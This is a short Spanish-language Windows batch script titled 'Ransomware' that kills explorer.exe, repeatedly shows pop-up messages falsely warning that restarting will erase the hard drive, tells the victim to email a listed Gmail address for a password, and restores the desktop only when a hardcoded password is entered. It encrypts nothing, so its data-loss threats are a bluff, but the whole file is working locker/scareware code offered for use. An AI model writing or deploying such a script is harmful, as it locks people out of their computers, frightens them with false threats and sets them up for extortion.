//[Versión 1.0]
echo =============================================
color 2
@echo off 
title Ransomware
echo =============================================
taskkill /f /im explorer.exe 
:bucle 
cls               
msg * LEE CON ATENCION!.
msg * NO REINICIAR LA COMPUTADORA!.
msg * AL REINICIAR SE ELIMINARA LOS DATOS DEL DISCO DURO!.
msg * TENGA CUIDADO! NO VAYA A CERRAR LA VENTANA DE ARRIBA.
msg * SI USTED CIERRA LA VENTANA! NO PODRA RECUPERAR SU COMPUTADORA!.
msg * ESCRIBIR A SlayerTitanZc@gmail.com PARA OBTENER EL PASSWORD!.
echo =============================================
echo SI USTED CIERRA ESTA VENTANA! NO PODRA RECUPERAR SU COMPUTADORA!.
echo =============================================
echo Ingresar el password que recibio por correo.
echo =============================================
set /p pass=Escriba aqui el password: 
if %pass%==SlayerTitanZc (goto passcorrecto) ELSE (goto bucle)
:passcorrecto
echo =============================================
echo Felicidades! El password es correcto.
echo =============================================
start explorer.exe 
pause
exit